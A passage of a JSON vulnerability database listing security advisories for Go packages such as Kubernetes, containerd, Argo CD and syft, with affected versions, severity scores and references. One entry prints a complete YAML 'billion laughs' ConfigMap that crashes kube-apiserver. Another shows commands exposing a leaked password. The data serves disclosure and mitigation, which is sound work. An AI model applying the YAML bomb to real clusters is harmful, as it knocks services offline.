"github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.2.15"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.3.0"}, {"fixed": "9.3.11"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1410"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://grafana.com/security/security-advisories/cve-2023-1410/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230420-0003/"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-23T20:10:27Z", "nvd_published_at": "2023-03-23T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jh36-q97c-9928", "modified": "2023-03-10T22:45:03Z", "published": "2023-03-01T21:30:18Z", "aliases": ["CVE-2022-3294"], "summary": "Kubernetes vulnerable to validation bypass", "details": "Users may have access to secure endpoints in the control plane network. Kubernetes clusters are only affected if an untrusted user can modify Node objects and send proxy requests to them. Kubernetes supports node proxying, which allows clients of kube-apiserver to access endpoints of a Kubelet to establish connections to Pods, retrieve container logs, and more. While Kubernetes already validates the proxying address for Nodes, a bug in kube-apiserver made it possible to bypass this validation. Bypassing this validation could allow authenticated requests destined for Nodes to to the API server's private network.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.25.0"}, {"fixed": "1.25.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.24.0"}, {"fixed": "1.24.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.23.0"}, {"fixed": "1.23.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.22.0"}, {"fixed": "1.22.16"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3294"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/113757"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/VyPOxF7CIbA"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230505-0007/"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-10T22:45:03Z", "nvd_published_at": "2023-03-01T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x623-hr8h-7g5v", "modified": "2023-02-10T22:32:39Z", "published": "2023-02-03T21:30:21Z", "aliases": ["CVE-2022-47762"], "summary": "Path Traversal in gin-vue-admin", "details": "In gin-vue-admin < 2.5.5, the download module has a Path Traversal vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/flipped-aurora/gin-vue-admin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.5.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-47762"}, {"type": "WEB", "url": "https://github.com/flipped-aurora/gin-vue-admin/issues/1309"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-10T22:32:39Z", "nvd_published_at": "2023-02-03T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4xgv-j62q-h3rj", "modified": "2023-06-13T23:50:39Z", "published": "2023-02-07T18:36:47Z", "aliases": [], "summary": "Panic during unmarshal of Hello Verify Request in github.com/pion/dtls/v2", "details": "### Impact\n\nDuring the unmarshalling of a hello verify request we could try to unmarshal into too small a buffer. is could result in a panic leading the program to crash.\n\nThis issue could be abused to cause a denial of service.\n\n### Workaround\n\nNone, upgrade to 2.2.4\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pion/dtls"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.5.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pion/dtls/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pion/dtls/security/advisories/GHSA-4xgv-j62q-h3rj"}, {"type": "WEB", "url": "https://github.com/pion/dtls/commit/a50d26c5e4eed2ca87509494ffef2d2ebd22b1eb"}, {"type": "PACKAGE", "url": "https://github.com/pion/dtls"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1534"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-07T18:36:47Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-74fp-r6jw-h4mp", "modified": "2023-09-29T15:14:38Z", "published": "2023-02-08T00:35:27Z", "aliases": [], "summary": "Kubernetes apimachinery packages vulnerable to unbounded recursion in JSON or YAML parsing", "details": "CVE-2019-11253 is a denial of service vulnerability in the kube-apiserver, allowing authorized users sending malicious YAML or JSON payloads to cause kube-apiserver to consume excessive CPU or memory, potentially crashing and becoming unavailable. \n\nWhen creating a ConfigMap object which has recursive references contained in it, excessive CPU usage can occur. This appears to be an instance of a \"Billion Laughs\" attack which is quite well known as an XML parsing issue.\n\nApplying this manifest to a cluster causes the client to hang for some time with considerable CPU usage.\n\n```yaml\napiVersion: v1\ndata:\n  a: &a [\"web\",\"web\",\"web\",\"web\",\"web\",\"web\",\"web\",\"web\",\"web\"]\n  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\n  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\n  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\n  e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\n  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\n  g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\n  h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\n  i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]\nkind: ConfigMap\nmetadata:\n  name: yaml-bomb\n  namespace: default\n```\n### Specific Go Packages Affected\n- k8s.io/apimachinery/pkg/runtime/serializer/json\n- k8s.io/apimachinery/pkg/util/json\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/apimachinery"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20190927203648-9ce6eca90e73"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11253"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/83253"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/83261"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-pmqp-h87c-mr78"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/jk8polzSUxs"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0965"}, {"type": "WEB", "url": "https://stackoverflow.com/questions/58129150/security-yaml-bomb-user-can-restart-kube-api-by-sending-configmap/"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-776"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:35:27Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-w55j-f7vx-6q37", "modified": "2023-10-02T11:55:19Z", "published": "2023-02-06T23:49:46Z", "aliases": ["CVE-2018-1103"], "summary": "Openshift Enterprise source-to-image vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip)", "details": "Openshift Enterprise source-to-image before version 1.1.10 is vulnerable to an improper validation of user input. An attacker who could trick a user into using the command to copy files locally, from a pod, could override files outside of the target directory of the command.\n\n### Specific Go Packages Affected\ngithub.com/openshift/source-to-image/pkg/tar", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openshift/source-to-image"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.10-0.20180427153919-f5cbcbc5cc6f"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1103"}, {"type": "WEB", "url": "https://github.com/openshift/source-to-image/pull/870"}, {"type": "WEB", "url": "https://github.com/openshift/source-to-image/commit/f5cbcbc5cc6f8cc2f479a7302443bea407a700cb"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-1103"}, {"type": "PACKAGE", "url": "https://github.com/openshift/source-to-image"}, {"type": "WEB", "url": "https://github.com/snyk/zip-slip-vulnerability"}, {"type": "WEB", "url": "https://hansmi.ch/articles/2018-04-openshift-s2i-security"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0026"}, {"type": "WEB", "url": "https://snyk.io/research/zip-slip-vulnerability"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-06T23:49:46Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-qgc7-mgm3-q253", "modified": "2023-06-13T23:47:06Z", "published": "2023-02-17T13:59:44Z", "aliases": ["CVE-2022-41727"], "summary": "Uncontrolled Resource Consumption in golang.org/x/image", "details": "An attacker can craft a malformed TIFF image which will consume a significant amount of memory when passed to DecodeConfig. This could lead to a denial of service.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/image"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41727"}, {"type": "WEB", "url": "https://go.dev/cl/468195"}, {"type": "WEB", "url": "https://go.dev/issue/58003"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/ag-FiyjlD5o"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KO54NBDUJXKAZNGCFOEYL2LKK2RQP6K6/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XWH6Q7NVM4MV3GWFEU4PA67AWZHVFJQ2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XZTEP6JYILRBNDTNWTEQ5D4QUUVQBESK/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1572"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-17T13:59:44Z", "nvd_published_at": "2023-02-28T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hmfx-3pcx-653p", "modified": "2023-02-16T17:38:22Z", "published": "2023-02-16T14:11:33Z", "aliases": ["CVE-2023-25173"], "summary": "Supplementary groups are not set up properly in github.com/containerd/containerd", "details": "### Impact\n\nA bug was found in containerd where supplementary groups are not set up properly inside a container.  If an attacker has direct access to a container and manipulates their supplementary group access, they may be able to use supplementary group access to bypass primary group restrictions in some cases, potentially gaining access to sensitive information or gaining the ability to execute code in that container.\n\nDownstream applications that use the containerd client library may be affected as well.\n\n### Patches\nThis bug has been fixed in containerd v1.6.18 and v.1.5.18.  Users should update to these versions and recreate containers to resolve this issue.  Users who rely on a downstream application that uses containerd's client library should check that application for a separate advisory and instructions.\n\n### Workarounds\n\nEnsure that the `\"USER $USERNAME\"` Dockerfile instruction is not used.  Instead, set the container entrypoint to a value similar to `ENTRYPOINT [\"su\", \"-\", \"user\"]` to allow `su` to properly set up supplementary groups.\n\n### References\n\n- https://www.benthamsgaze.org/2022/08/22/vulnerability-in-linux-containers-investigation-and-mitigation/\n- Docker/Moby: CVE-2022-36109, fixed in Docker 20.10.18\n- CRI-O: CVE-2022-2995, fixed in CRI-O 1.25.0\n- Podman: CVE-2022-2989, fixed in Podman 3.0.1 and 4.2.0\n- Buildah: CVE-2022-2990, fixed in Buildah 1.27.1\n\nNote that CVE IDs apply to a particular implementation, even if an issue is common.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at [security@containerd.io](mailto:security@containerd.io)\n\nTo report a security issue in containerd:\n* [Report a new vulnerability](https://github.com/containerd/containerd/security/advisories/new)\n* Email us at [security@containerd.io](mailto:security@containerd.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.18"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.18"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-hmfx-3pcx-653p"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-rc4r-wh2q-q6c4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25173"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/133f6bb6cd827ce35a5fb279c1ead12b9d21460a"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-4wjj-jwc9-2x96"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-fjm8-m7m6-2fjp"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-phjr-8j92-w5v7"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.5.18"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.6.18"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XNF4OLYZRQE75EB5TW5N42FSXHBXGWFE/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1574"}, {"type": "WEB", "url": "https://www.benthamsgaze.org/2022/08/22/vulnerability-in-linux-containers-investigation-and-mitigation/"}], "database_specific": {"cwe_ids": ["CWE-269", "CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-16T14:11:33Z", "nvd_published_at": "2023-02-16T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4gj3-6r43-3wfc", "modified": "2023-02-17T20:32:08Z", "published": "2023-02-10T19:54:14Z", "aliases": ["CVE-2023-23631"], "summary": "IPFS go-unixfsnode subject to DOS via HAMT Decoding Panics", "details": "## Impact\n\nTrying to read malformed HAMT sharded directories can cause panics and virtual memory leaks.\nIf you are reading untrusted user input, an attacker can then trigger a panic.\n\nThis is caused by a bogus fanout parameter in the HAMT directory nodes.\nThis includes checks returned in [ipfs/go-bitfield GHSA-2h6c-j3gf-xp9r](https://github.com/ipfs/go-bitfield/security/advisories/GHSA-2h6c-j3gf-xp9r), as well as limiting the fanout to <= 1024 (to avoid attempts of arbitrary sized allocations).\n\n## Patches\n- https://github.com/ipfs/go-unixfsnode/commit/91b3d39d33ef0cd2aff2c95d50b2329350944b68\n- https://github.com/ipfs/go-unixfsnode/commit/a4ed723727e0bdc2277158337c2fc0d82802d122\n\n## References\n\n* https://github.com/ipfs/go-unixfs/security/advisories/GHSA-q264-w97q-q778\n* https://github.com/ipfs/go-bitfield/security/advisories/GHSA-2h6c-j3gf-xp9r\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-unixfsnode"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/go-unixfsnode/security/advisories/GHSA-4gj3-6r43-3wfc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-23631"}, {"type": "WEB", "url": "https://github.com/ipfs/go-unixfsnode/commit/59050ea8bc458ae55246ae09243e6e165923e076"}, {"type": "WEB", "url": "https://github.com/ipfs/go-unixfsnode/commit/91b3d39d33ef0cd2aff2c95d50b2329350944b68"}, {"type": "WEB", "url": "https://github.com/ipfs/go-unixfsnode/commit/a4ed723727e0bdc2277158337c2fc0d82802d122"}, {"type": "PACKAGE", "url": "https://github.com/ipfs/go-unixfsnode"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1559"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-10T19:54:14Z", "nvd_published_at": "2023-02-09T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3jfq-742w-xg8j", "modified": "2023-02-16T20:47:25Z", "published": "2023-02-16T20:47:25Z", "aliases": ["CVE-2023-23947"], "summary": "Users with any cluster secret update access may update out-of-bounds cluster secrets", "details": "### Impact\n\nAll Argo CD versions starting with v2.3.0-rc1 are vulnerable to an improper authorization bug which allows users who have the ability to update at least one cluster secret to update any cluster secret.\n\nThe attacker could use this access to escalate privileges (potentially controlling Kubernetes resources) or to break Argo CD functionality (by preventing connections to external clusters).\n\n#### How the Attack Works\n\nArgo CD stores [cluster access configurations](https://argo-cd.readthedocs.io/en/stable/operator-manual/declarative-setup/#clusters) as Kubernetes Secrets. To take advantage of the vulnerability, an attacker must know the server URL for the cluster secret they want to modify. \n\nThe attacker must be authenticated with the Argo CD API server, and they must be authorized to update at least one ([non project-scoped](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/#project-scoped-repositories-and-clusters)) cluster. Then they must craft a malicious request to the Argo CD API server.\n\n#### Removing Deployment Restrictions\n\nA cluster Secret's `clusterResources` field determines whether Argo CD users may deploy cluster-scoped resources to that cluster. The `namespaces` field determines the namespaces to which Argo CD users may deploy resources.\n\nYou can use this command to determine whether any of your cluster configurations employ these restrictions (replace `argocd` with the namespace of your Argo CD installation):\n\n```shell\nkubectl get secret -n argocd -l 'argocd.argoproj.io/secret-type=cluster' -ojson | jq '.items |\n  map(.data |= with_entries(.value |= @base64d)) |  # base64-decode secrets\n  map(select(.data | (\n    (.clusterResources != null and .clusterResources == \"false\") or # we deny cluster-scoped resource management\n    (.namespaces != null and .namespaces != \"\")                     # we are only managing certain clusters\n  )) | .metadata.name)'\n```\n\nThe `clusterResources` and `namespaces` fields are one line of defense against unauthorized management of Kubernetes resources. Users should also have AppProject and RBAC restrictions in place.\n\nIf `clusterResources: \"false\"` or `namespaces: \"some,namespaces\"` are the _only_ mechanisms preventing an attacker from maliciously managing certain resources via Argo CD, then this vulnerability could allow that attacker to manage out-of-bounds resources via Argo CD (create, get, update, delete).\n\n#### Modifying Connection Parameters\n\nCluster secrets also hold client configuration for connecting to the remote cluster. One option is to skip TLS certificate verification. An attacker could disable certificate verification in an effort to achieve a malicious-in-the-middle (MITM) attack.\n\nAlternatively, an attacker could apply an invalid configuration (for example, by setting an invalid bearer token) and achieve a denial-of-service by preventing Argo CD from managing the target cluster.\n\n#### Changing Unscoped Clusters to be Scoped\n\nThe vulnerability also allows an attacker to modify a previously-unscoped cluster and make it [scoped](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/#project-scoped-repositories-and-clusters). This is important if you are using `permitOnlyProjectScopedClusters: true` in a project under which the attacker can deploy. By scoping a previously-unscoped cluster under that project, they can grant themselves the ability to manage resources on the target cluster.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.6.2\n* v2.5.11\n* v2.4.23\n* v2.3.17\n\n### Workarounds\n\nThe best way to mitigate the vulnerability is to upgrade. The following two sections explain other ways to mitigate the vulnerability if you are currently unable to upgrade.\n\n#### Limit Users with Cluster Update Access\n\nThe only complete mitigation besides upgrading is to modify your RBAC configuration to completely revoke all `clusters, update` access.\n\nTo exploit this vulnerability, an attacker must have access to update at least one cluster configuration. Check your [RBAC configuration](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/), for lines like this:\n\n```\np, role:developers, clusters, update, *, allow\np, role:developers, clusters, *, *, allow\np, role:developers, *, update, *, allow\n```\n\nRevoke `clusters, update` access for any users who do not absolutely need that access.\n\n#### Restrict Resource Management via AppProjects and RBAC\n\n[AppProjects](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/#projects) are a primary tool to restrict what resources may be managed via Argo CD.\n\nYou can use the `destinations` and `clusterResourceWhitelist` fields to apply similar restrictions as the `namespaces` and `clusterResources` fields described above.\n\n```yaml\napiVersion: argoproj.io/v1alpha1\nkind: AppProject\nspec:\n  destinations:\n  # Only allow Applications managed by this AppProject to manage to the `allowed-namespace` namespace.\n  - namespace: 'allowed-namespace'\n    server: 'https://your-server'\n  # Do not allow Applications managed by this AppProject to manage any cluster-scoped resources.\n  clusterResourceWhitelist: []\n```\n\nAlong with adding AppProject restrictions, make sure that your RBAC restrictions are strict enough.\n\nFor example, limit `projects, update` access to Argo CD administrators only. Also use the `{project}` field in `applications, *, {project}/{application}` field to limit users' access to certain, restricted, AppProjects. \n\nAppProject restrictions can only prevent Applications from managing out-of-bounds resources. It cannot prevent an attacker from maliciously changing cluster connection TLS configuration.\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.23"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-3jfq-742w-xg8j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-23947"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/fbb0b99b1ac3361b253052bd30259fa43a520945"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-02-16T20:47:25Z", "nvd_published_at": "2023-02-16T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-259w-8hf6-59c2", "modified": "2023-02-24T19:11:47Z", "published": "2023-02-16T14:12:36Z", "aliases": ["CVE-2023-25153"], "summary": "OCI image importer memory exhaustion in github.com/containerd/containerd", "details": "### Impact\n\nWhen importing an OCI image, there was no limit on the number of bytes read for certain files. A maliciously crafted image with a large file where a limit was not applied could cause a denial of service.\n\n### Patches\n\nThis bug has been fixed in containerd 1.6.18 and 1.5.18.  Users should update to these versions to resolve the issue.\n\n### Workarounds\n\nEnsure that only trusted images are used and that only trusted users have permissions to import images. \n\n### Credits\n\nThe containerd project would like to thank [David Korczynski](https://github.com/DavidKorczynski) and [Adam Korczynski](https://github.com/AdamKorcz) of ADA Logics for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md) during a security fuzzing audit sponsored by CNCF.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at [security@containerd.io](mailto:security@containerd.io)\n\nTo report a security issue in containerd:\n* [Report a new vulnerability](https://github.com/containerd/containerd/security/advisories/new)\n* Email us at [security@containerd.io](mailto:security@containerd.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.18"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.18"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-259w-8hf6-59c2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25153"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/0c314901076a74a7b797a545d2f462285fdbb8c4"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.5.18"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.6.18"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1573"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-16T14:12:36Z", "nvd_published_at": "2023-02-16T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jp7v-3587-2956", "modified": "2023-02-08T21:38:46Z", "published": "2023-02-08T21:38:46Z", "aliases": ["CVE-2023-24827"], "summary": "Credential disclosure in syft when SYFT_ATTEST_PASSWORD environment variable set", "details": "A password disclosure flaw was found in Syft versions v0.69.0 and v0.69.1. This flaw leaks the password stored in the SYFT_ATTEST_PASSWORD environment variable.\n\n### Impact\nThe `SYFT_ATTEST_PASSWORD` environment variable is for the `syft attest` command to generate attested SBOMs for the given container image. This environment variable is used to decrypt the private key (provided with `syft attest --key <path-to-key-file>`)  during the signing process while generating an SBOM attestation. \n\nThis vulnerability affects users running syft that have the `SYFT_ATTEST_PASSWORD` environment variable set with credentials (regardless of if the attest command is being used or not). Users that do not have the environment variable `SYFT_ATTEST_PASSWORD` set are not affected by this issue.\n\nThe credentials are leaked in two ways:\n- in the syft logs when `-vv` or `-vvv` are used in the syft command (which is any log level >= `DEBUG`)\n- in the attestation or SBOM only when the `syft-json` format is used \n\nNote that as of v0.69.0 any generated attestations by the `syft attest` command are uploaded to the OCI registry (if you have write access to that registry) in the same way `cosign attach` is done. This means that any attestations generated for the affected versions of syft when the `SYFT_ATTEST_PASSWORD` environment variable was set would leak credentials in the attestation payload uploaded to the OCI registry.\n\nExample commands run from affected versions of syft that show the credential disclosure:\n```bash\n$ SYFT_ATTEST_PASSWORD=123456 syft <container-image-or-directory-input> -o syft-json | grep 123456\n# \"123456\" is in the output\n\n$ SYFT_ATTEST_PASSWORD=123456 syft attest <container-image-input> -o syft-json \n$ cosign download attestation <container-image-input> | jq -r '.payload' | base64 -d | grep 123456\n# \"123456\" is in the output\n```\n\n### Patches\n\nThe patch has been released in v0.70.0.\n\n### Workarounds\n\nThere are no workarounds for this vulnerability.\n\n### References\n\nPatch pull request: https://github.com/anchore/syft/pull/1538", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/anchore/syft"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.69.0"}, {"fixed": "0.70.0"}]}]}], "references": [{"type": "WEB", "url": 